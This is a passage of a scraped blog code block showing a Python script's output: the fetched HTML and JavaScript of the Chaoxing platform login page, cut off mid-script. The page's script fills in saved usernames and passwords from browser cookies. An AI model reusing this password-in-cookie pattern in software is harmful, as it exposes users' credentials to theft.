class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br></pre></td><td class="code"><pre><span class="line">G:\pythonp\python.exe C:/Users/<span class="number">74292</span>/PycharmProjects/untitled7/获取cookie.py</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;登录&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/nervous/css/reset2.css?v=2"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/nervous/css/jquery.mCustomScrollbar.css"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/nervous/css/login2.css?v=2"</span>/&gt;</span><br><span class="line">&lt;script src="/nervous/js/jquery-1.11.3.min.js"&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src="/nervous/js/cookie.js"&gt;&lt;/script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">     iframe&#123;</span><br><span class="line">        height: <span class="number">260</span>px;</span><br><span class="line">        width: <span class="number">220</span>px;</span><br><span class="line">        margin: <span class="number">30</span>px <span class="number">70</span>px;</span><br><span class="line">      &#125;</span><br><span class="line">  .isLogin&#123;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">        margin-top: <span class="number">10</span>px;</span><br><span class="line">        width:<span class="number">100</span>%;</span><br><span class="line">  &#125;</span><br><span class="line">  .isLogin span&#123;</span><br><span class="line">     display:block;</span><br><span class="line">  &#125;</span><br><span class="line">  .isLogin span.remPwd&#123;</span><br><span class="line">     float:right;</span><br><span class="line">  &#125;</span><br><span class="line">  .isLogin span.remPwd i&#123;</span><br><span class="line">  display:block;</span><br><span class="line">  float:left;</span><br><span class="line">  &#125;</span><br><span class="line">  .isLogin span input&#123;</span><br><span class="line">    display: block;</span><br><span class="line">            float: left;</span><br><span class="line">            width: <span class="number">14</span>px;</span><br><span class="line">            height: <span class="number">14</span>px;</span><br><span class="line">            margin-top: <span class="number">2</span>px;</span><br><span class="line">            margin-left: <span class="number">5</span>px;</span><br><span class="line">  &#125;</span><br><span class="line">  .isLogin span.orgLogin&#123;</span><br><span class="line">     float:left;</span><br><span class="line"> color: <span class="comment">#4d77ff;</span></span><br><span class="line">  &#125;</span><br><span class="line">  .content .login-area&#123;</span><br><span class="line">         min-height: <span class="number">400</span>px!important;</span><br><span class="line"> height: initial;</span><br><span class="line">  &#125;</span><br><span class="line">  .content .login-area .tab-con .btn.btn-red&#123;</span><br><span class="line">       margin-top:<span class="number">20</span>px;</span><br><span class="line">   margin-bottom:<span class="number">40</span>px;</span><br><span class="line">  &#125;</span><br><span class="line">  .register&#123;</span><br><span class="line">      bottom:<span class="number">20</span>px;</span><br><span class="line">  &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="window"&gt;</span><br><span class="line">    &lt;div class="head"&gt;</span><br><span class="line">        &lt;div class="head-center"&gt;</span><br><span class="line">            &lt;div class="chaoxing-logo"&gt;</span><br><span class="line">                &lt;img src=<span class="string">"/nervous/images/logo.png"</span>/&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;span class="black"&gt;超星微服务平台&lt;/span&gt;</span><br><span class="line">            &lt;div class="opreate"&gt;</span><br><span class="line">                &lt;ul&gt;</span><br><span class="line">                    &lt;li class="appDown black"&gt;</span><br><span class="line">                        &lt;a href="javascript:void(0)"&gt;移动端下载&lt;/a&gt;</span><br><span class="line">                    &lt;/li&gt;</span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div class="matrix-code"&gt;</span><br><span class="line">                &lt;img src=<span class="string">"/nervous/images/QR-code.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">                &lt;h4&gt;扫一扫下载学习通&lt;/h4&gt;</span><br><span class="line">                &lt;div class="triangle"&gt;&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="content"&gt;</span><br><span class="line">        &lt;div class="center"&gt;</span><br><span class="line">            &lt;div class="login-area login-box"&gt;</span><br><span class="line">                &lt;div class="tab red"&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        &lt;li class="active"&gt;扫码登录&lt;/li&gt;</span><br><span class="line">                        &lt;li&gt;手机号/超星号登录&lt;/li&gt;</span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="tab-con"&gt;</span><br><span class="line">                     &lt;!-- &lt;div class="item" style="display: block;"&gt;</span><br><span class="line">                        &lt;img src=<span class="string">"/nervous/images/QR-code.png"</span>/&gt;</span><br><span class="line">                        &lt;p&gt;使用学习通APP扫码登录&lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;--&gt;</span><br><span class="line">                    &lt;div class="code-login item"&gt;</span><br><span class="line">                        &lt;!-- &lt;p class="text1"&gt;使用 超星学习通 APP 扫码登录&lt;/p&gt; --&gt;</span><br><span class="line">                        &lt;iframe id="iframe" src="http://passport2.chaoxing.com/cloudscanlogin?mobiletip=%e7%94%b5%e8%84%91%e7%ab%af%e7%99%bb%e5%bd%95%e7%a1%ae%e8%ae%a4&amp;pcrefer=http://i.chaoxing.com" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no"  class="QR-code"&gt;&lt;/iframe&gt;</span><br><span class="line">                        &lt;!-- &lt;p class="text2"&gt;没有账号</span><br><span class="line">                            &lt;a&gt;立即注册&lt;/a&gt;</span><br><span class="line">                        &lt;/p&gt; </span><br><span class="line">                         &lt;div class="register" style="margin: 21px 0 0 38px;"&gt;没有账号，去 &lt;span&gt;注册&lt;/span&gt;&lt;/div&gt;--&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="item" style="display: none;"&gt;</span><br><span class="line">                        &lt;div class="inp"&gt;</span><br><span class="line">                            &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"请输入手机号/超星号"</span>/ id = <span class="string">"uin_tips"</span>&gt;</span><br><span class="line">                            &lt;p class="error-tips" id="uin_error"&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class="inp" style="height: inherit; overflow: hidden;"&gt;</span><br><span class="line">                            &lt;input type=<span class="string">"password"</span> placeholder=<span class="string">"请输入密码"</span> id = <span class="string">"pwd_tips"</span>/&gt;</span><br><span class="line">                            &lt;p class="error-tips" id="pwd_error"&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class="isLogin"&gt;</span><br><span class="line">&lt;span class="remPwd"&gt;&lt;i&gt;记住密码&lt;/i&gt;&lt;input id="memorization" type="checkbox" value="" /&gt; &lt;/span&gt; </span><br><span class="line">                            &lt;span onclick="orgLogin();" class="orgLogin"&gt;机构账号登录&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;input type="button" class="btn btn-red disable" value="登录" id="login"  onclick="prevlogin();"&gt;</span><br><span class="line">                        &lt;!-- 没有账号，去注册 --&gt;</span><br><span class="line">                        &lt;div class="register"&gt;没有账号，去 &lt;span&gt;注册&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;!-- 注册--&gt;</span><br><span class="line">            &lt;div class="login-area register-area" style="display: none;"&gt;</span><br><span class="line">                &lt;div class="register-title"&gt;注册&lt;/div&gt;</span><br><span class="line">                &lt;div class="userInfo"&gt;</span><br><span class="line">                    &lt;div class="inp"&gt;</span><br><span class="line">                        &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"输入姓名"</span> id=<span class="string">"rname"</span> onblur=<span class="string">"changeName();"</span>&gt;</span><br><span class="line">                        &lt;p class="error-tips" id="rname_error"&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="inp"&gt;</span><br><span class="line">                        &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"输入手机号"</span> id=<span class="string">"rtel"</span> onblur=<span class="string">"changeTel();"</span>&gt;</span><br><span class="line">                        &lt;p class="error-tips" id="rtel_error"&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="inp"&gt;</span><br><span class="line">                        &lt;input type=<span class="string">"password"</span> placeholder=<span class="string">"设置密码(6-16位)"</span> id=<span class="string">"rpwd"</span> onblur=<span class="string">"changePwd();"</span>&gt;</span><br><span class="line">                        &lt;img class="clickLook" src="/nervous/images/not_look.png" alt=""&gt;</span><br><span class="line">                        &lt;p class="error-tips" id="rpwd_error"&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="inp"&gt;</span><br><span class="line">                        &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"输入验证码"</span> id=<span class="string">"rcode"</span> onblur=<span class="string">"getRcode();"</span>&gt;</span><br><span class="line">                        &lt;!-- 加入 hasSeed 是发送验证码后的样式--&gt;</span><br><span class="line">                        &lt;div class="authCode" onclick="sendCode();"&gt;发送验证码&lt;/div&gt;</span><br><span class="line">                        &lt;p class="error-tips" id="rcode_error"&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &lt;!-- 加入 disable 是不能注册的按钮样式 --&gt;</span><br><span class="line">                &lt;div class="register-btn"&gt;注册&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &lt;div class="go-login"&gt;已有账号，去 &lt;span&gt;登录&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class="maker"&gt;</span><br><span class="line">                &lt;p class="title1 title3"&gt;超星微服务平台&lt;/p&gt;</span><br><span class="line">                &lt;img src=<span class="string">"/nervous/images/maker_2.png"</span>/&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">            &lt;!--机构登录--&gt;</span><br><span class="line">            &lt;div class="login-area register-unit"&gt;</span><br><span class="line">                &lt;div class="unitTitle"&gt;</span><br><span class="line">                    &lt;img src=<span class="string">"/nervous/images/unitBack.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">                    &lt;h3&gt;机构账号登录&lt;/h3&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="registerCon"&gt;</span><br><span class="line">                    &lt;p class="registerTips"&gt;输入学号、借书证号需预先&lt;i&gt;选择单位&lt;/i&gt;&lt;/p&gt;</span><br><span class="line">                    &lt;p class="registerChange" id="org_info"&gt;&lt;i&gt;切换单位&lt;/i&gt;&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="registerUser"&gt;</span><br><span class="line">                    &lt;input type=<span class="string">"text"</span> placeholder=<span class="string">"学号/工号"</span> id=<span class="string">"org_name"</span>&gt;</span><br><span class="line">                    &lt;p id="oname_error"&gt;&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="registerPwd"&gt;</span><br><span class="line">                    &lt;input type=<span class="string">"password"</span> placeholder=<span class="string">"密码"</span>  id=<span class="string">"org_pwd"</span>&gt;</span><br><span class="line">                    &lt;p id="opwd_error"&gt;&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="registerCode"&gt;</span><br><span class="line">                    &lt;input type="text" placeholder="请输入右边四位数字" class="codeCon" id="org_code"&gt;</span><br><span class="line">                    &lt;img class="codeImg" id="imgCode" src="/code/create.shtml"/&gt;</span><br><span class="line">                    &lt;span onclick="getImgCode();"&gt;看不清？&lt;/span&gt;</span><br><span class="line">&lt;p id="ocode_error"&gt;&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class="registerBtn"&gt;登录&lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 选择单位弹窗--&gt;</span><br><span class="line">    &lt;div class="marsker"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="popup unitPopup"&gt;</span><br><span class="line">        &lt;div class="popupTitle"&gt;</span><br><span class="line">            &lt;h3&gt;选择单位&lt;/h3&gt;</span><br><span class="line">            &lt;div class="popupClose"&gt;</span><br><span class="line">                &lt;img src=<span class="string">"/nervous/images/closeBtn.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="popupSearch"&gt;</span><br><span class="line">            &lt;div class="searchCon"&gt;</span><br><span class="line">                &lt;img src=<span class="string">"/nervous/images/iconSearch.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">                &lt;input type="text" placeholder="单位名称" class="resouseName" onkeydown="keydowdSearch(event);"&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button&gt;搜索&lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="popupResult"&gt;</span><br><span class="line">            &lt;div class="popupProvince fl"&gt;</span><br><span class="line">                &lt;ul id=<span class="string">"provinceUl"</span>&gt;</span><br><span class="line">                   </span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class="popupWorks fl"&gt;</span><br><span class="line">                &lt;div class="initials"&gt;</span><br><span class="line">                    &lt;div class="allWorks active"&gt;全部&lt;/div&gt;</span><br><span class="line">                    &lt;div class="initialsList"&gt;</span><br><span class="line">                        &lt;ul id=<span class="string">"allWorksUl"</span>&gt;</span><br><span class="line">                            &lt;li&gt;A&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;B&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;C&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;D&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;E&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;F&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;G&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;H&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;I&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;J&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;K&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;L&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;M&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;N&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;O&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;P&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;Q&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;R&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;S&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;T&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;U&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;V&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;W&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;X&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;Y&lt;/li&gt;</span><br><span class="line">                            &lt;li&gt;Z&lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="workList"&gt;</span><br><span class="line">                        &lt;ul id=<span class="string">"orgList"</span>&gt;</span><br><span class="line"></span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="searchResult"&gt;</span><br><span class="line">            &lt;div class="goBack"&gt;&lt;span&gt;返回&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">            &lt;div class="workList searchResultList "&gt;</span><br><span class="line">                &lt;ul&gt;</span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="workHover"&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class="foot-er black"&gt;版权所有©超星公司 京 B2-20080224-16 Copyright©超星&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script src="/nervous/js/jquery.mCustomScrollbar.concat.min.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type="text/javascript" src="/nervous/js/login.js?v=1"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">var type=<span class="number">1</span>;</span><br><span class="line">    var rcode = <span class="string">""</span>;</span><br><span class="line">    (function () &#123;</span><br><span class="line"></span><br><span class="line">       //分析cookie值，显示上次的登陆信息   </span><br><span class="line">   var memorization = getCookieValue(<span class="string">"memorization"</span>); </span><br><span class="line">    var userNameValue = getCookieValue(<span class="string">"userName"</span>); </span><br><span class="line">        var userNameValue = getCookieValue(<span class="string">"userName"</span>); </span><br><span class="line"><span class="keyword">if</span>(memorization!=null &amp;&amp; memorization!=undefined &amp;&amp; memorization!=<span class="string">''</span> &amp;&amp; memorization!=<span class="string">'null'</span> &amp;&amp; memorization==<span class="string">'true'</span> )&#123;</span><br><span class="line">$(<span class="string">"#memorization"</span>).attr(<span class="string">"checked"</span>,<span class="string">"checked"</span>);</span><br><span class="line">var flag=true;</span><br><span class="line">    <span class="keyword">if</span>(userNameValue!=null &amp;&amp; userNameValue!=undefined &amp;&amp; userNameValue!=<span class="string">''</span> &amp;&amp; userNameValue!=<span class="string">'null'</span>)&#123;</span><br><span class="line">    $(<span class="string">"#uin_tips"</span>).val(userNameValue);  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">flag=false;</span><br><span class="line">&#125;</span><br><span class="line">           var passWordValue = getCookieValue(<span class="string">"passWord"</span>);   </span><br><span class="line">       <span class="keyword">if</span>(passWordValue!=null &amp;&amp; passWordValue!=undefined &amp;&amp; passWordValue!=<span class="string">''</span> &amp;&amp; passWordValue!=<span class="string">'null'</span>)&#123;</span><br><span class="line">     $(<span class="string">"#pwd_tips"</span>).val(passWordValue); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">flag=false;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                $(<span class="string">"#login"</span>).removeClass(<span class="string">"disable"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$(<span class="string">"#login"</span>).addClass(<span class="string">"disable"</span>);</span><br><span class="line">$(<span class="string">"#memorization"</span>).removeAttr(<span class="string">"checked"</span>);</span><br><span class="line">deleteCookie(<span class="string">"userName"</span>,<span class="string">""</span>);</span><br><span class="line">deleteCookie(<span class="string">"passWord"</span>,<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line">        //  滚动条</span><br><span class="line">        $(<span class="string">".workList"</span>).mCustomScrollbar();</span><br><span class="line">        /* table的hover */</span><br><span class="line">        $(<span class="string">".workList li"</span>).on(<span class="string">'mouseenter'</span>, function (e) &#123;</span><br><span class="line">            var leftX = e.pageX + <span class="number">10</span>;</span><br><span class="line">            var topY = e.pageY + <span class="number">10</span>;</span><br><span class="line">            console.log(leftX, topY);</span><br><span class="line">            var tdText = $(this).text();</span><br><span class="line">            $(<span class="string">".workHover"</span>).text(tdText);</span><br><span class="line">            $(<span class="string">".workHover"</span>).css(&#123;<span class="string">'left'</span>: leftX, <span class="string">'top'</span>: topY&#125;).show();</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">".workList li"</span>).on(<span class="string">'mouseleave'</span>, function () &#123;</span><br><span class="line">            $(<span class="string">".workHover"</span>).hide();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 选择单位</span><br><span class="line">$(<span class="string">"body"</span>).on(<span class="string">'click'</span>,<span class="string">'.workList li'</span>,function()&#123;</span><br><span class="line">var name=$(this).attr(<span class="string">"title"</span>);</span><br><span class="line">var fid=$(this).attr(<span class="string">"id"</span>);</span><br><span class="line">var domain=$(this).attr(<span class="string">"domain"</span>);</span><br><span class="line">            $(<span class="string">".searchCon input"</span>).val(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span>(name!=null &amp;&amp; name!=undefined &amp;&amp; name!=<span class="string">''</span> &amp;&amp; name!=<span class="string">'null'</span> &amp;&amp;</span><br><span class="line">fid!=null &amp;&amp; fid!=undefined &amp;&amp; fid!=<span class="string">''</span> &amp;&amp; fid!=<span class="string">'null'</span> )&#123;</span><br><span class="line">$(<span class="string">"#org_info"</span>).html(name+<span class="string">"&lt;i&gt;切换单位&lt;/i&gt;"</span>).attr(<span class="string">"fid"</span>,fid).attr(<span class="string">"domain"</span>,domain);</span><br><span class="line">                $(this).addClass(<span class="string">'active'</span>).siblings().removeClass(<span class="string">"active"</span>);</span><br><span class="line">                $(<span class="string">".marsker,.unitPopup,.registerTips"</span>).hide();</span><br><span class="line">                $(<span class="string">".register-unit"</span>).show();</span><br><span class="line">                $(<span class="string">".registerChange"</span>).show();</span><br><span class="line">getImgCode();</span><br><span class="line">&#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">".marsker,.popupClose"</span>).click(function () &#123;</span><br><span class="line">var fid=$(<span class="string">"#org_info"</span>).attr(<span class="string">"fid"</span>);</span><br><span class="line"><span class="keyword">if</span>(fid!=null &amp;&amp; fid!=undefined &amp;&amp; fid!=<span class="string">''</span> &amp;&amp; fid!=<span class="string">'null'</span> )&#123;</span><br><span class="line">$(<span class="string">".registerTips"</span>).hide();</span><br><span class="line">                $(<span class="string">".register-unit"</span>).show();</span><br><span class="line">                $(<span class="string">".registerChange"</span>).show();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $(<span class="string">".register-unit"</span>).show();</span><br><span class="line">                $(<span class="string">".registerTips"</span>).show();</span><br><span class="line">$(<span class="string">".registerChange"</span>).hide();</span><br><span class="line">&#125;</span><br><span class="line">            $(<span class="string">".marsker,.unitPopup"</span>).hide();</span><br><span class="line">            $(<span class="string">".searchCon input"</span>).val(<span class="string">""</span>);</span><br><span class="line">getImgCode();</span><br><span class="line">        &#125;);</span><br><span class="line">        // 选择省</span><br><span class="line">$(<span class="string">"body"</span>).on(<span class="string">'click'</span>,<span class="string">'.popupProvince li'</span>,function()&#123;</span><br><span class="line">            $(this).addClass(<span class="string">'active'</span>).siblings().removeClass(<span class="string">'active'</span>);</span><br><span class="line">getOrgList();</span><br><span class="line">        &#125;);</span><br><span class="line">        // 选择首字母</span><br><span class="line">$(<span class="string">"body"</span>).on(<span class="string">'click'</span>,<span class="string">'.initialsList li'</span>,function()&#123;</span><br><span class="line">            $(this).addClass(<span class="string">'active'</span>).siblings().removeClass(<span class="string">'active'</span>);</span><br><span class="line">            $(<span class="string">".allWorks"</span>).removeClass(<span class="string">'active'</span>);</span><br><span class="line">getOrgList();</span><br><span class="line">        &#125;);</span><br><span class="line">// 选择字母全部</span><br><span class="line">$(<span class="string">"body"</span>).on(<span class="string">'click'</span>,<span class="string">'.allWorks'</span>,function()&#123;</span><br><span class="line">            $(this).addClass(<span class="string">'active'</span>);</span><br><span class="line">            $(<span class="string">".initialsList li"</span>).removeClass(<span class="string">'active'</span>);</span><br><span class="line">getOrgList();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 是否为空</span><br><span class="line">        $(<span class="string">".registerUser input,.registerPwd input,.registerCode input"</span>).keyup(function () &#123;</span><br><span class="line">            isNull();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        function isNull() &#123;</span><br><span class="line">            <span class="keyword">if</span> ($(<span class="string">".registerUser input"</span>).val() &amp;&amp; $(<span class="string">".registerPwd input"</span>).val() &amp;&amp; $(<span class="string">".registerCode input"</span>).val()) &#123;</span><br><span class="line">                $(<span class="string">".registerBtn"</span>).addClass(<span class="string">'registerBtnActive'</span>).attr(<span class="string">"onclick"</span>,<span class="string">"orglogin();"</span>);;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">".registerBtn"</span>).removeClass(<span class="string">'registerBtnActive'</span>).removeAttr(<span class="string">"onclick"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">$(<span class="string">"body"</span>).on(<span class="string">'click'</span>, <span class="string">'.registerChange i,.registerTips i'</span>, function () &#123;</span><br><span class="line">            $(<span class="string">".marsker,.unitPopup"</span>).show();</span><br><span class="line">getProvince();</span><br><span class="line">        &#125;);</span><br><span class="line">        // 搜索</span><br><span class="line">        $(<span class="string">".resouseName"</span>).keyup(function () &#123;</span><br><span class="line">            <span class="keyword">if</span> ($(this).val().length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                $(<span class="string">".popupSearch button"</span>).addClass(<span class="string">'btnIpt'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">".popupSearch button"</span>).removeClass(<span class="string">'btnIpt'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">"body"</span>).on(<span class="string">'click'</span>,<span class="string">'.popupSearch .btnIpt'</span>,function () &#123;</span><br><span class="line">           $(<span class="string">".popupResult"</span>).hide();</span><br><span class="line">           $(<span class="string">".searchResult"</span>).show();</span><br><span class="line">           searchOrgList();</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        // 搜索结果返回</span><br><span class="line">        $(<span class="string">".searchResult .goBack"</span>).click(function () &#123;</span><br><span class="line">            $(<span class="string">".popupResult"</span>).show();</span><br><span class="line">            $(<span class="string">".searchResult"</span>).hide();</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 返回</span><br><span class="line">        $(<span class="string">".unitTitle img"</span>).click(function () &#123;</span><br><span class="line">type=<span class="number">1</span>;</span><br><span class="line">$(<span class="string">"#org_info"</span>).html(<span class="string">"&lt;i&gt;切换单位&lt;/i&gt;"</span>).removeAttr(<span class="string">"fid"</span>).removeAttr(<span class="string">"domain"</span>);</span><br><span class="line">            $(<span class="string">".register-unit"</span>).hide();</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        var clickStatus = true;</span><br><span class="line">        $(<span class="string">".appDown"</span>).click(function (event) &#123;</span><br><span class="line">            event.stopPropagation();</span><br><span class="line">            <span class="keyword">if</span> (clickStatus) &#123;</span><br><span class="line">                $(<span class="string">".matrix-code"</span>).show();</span><br><span class="line">                clickStatus = false;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(<span class="string">".matrix-code"</span>).hide();</span><br><span class="line">                clickStatus = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">"body"</span>).on(<span class="string">'click'</span>, function (event) &#123;</span><br><span class="line">            event.stopPropagation();</span><br><span class="line">            $(<span class="string">".matrix-code"</span>).hide();</span><br><span class="line">            clickStatus = true;</span><br><span class="line">        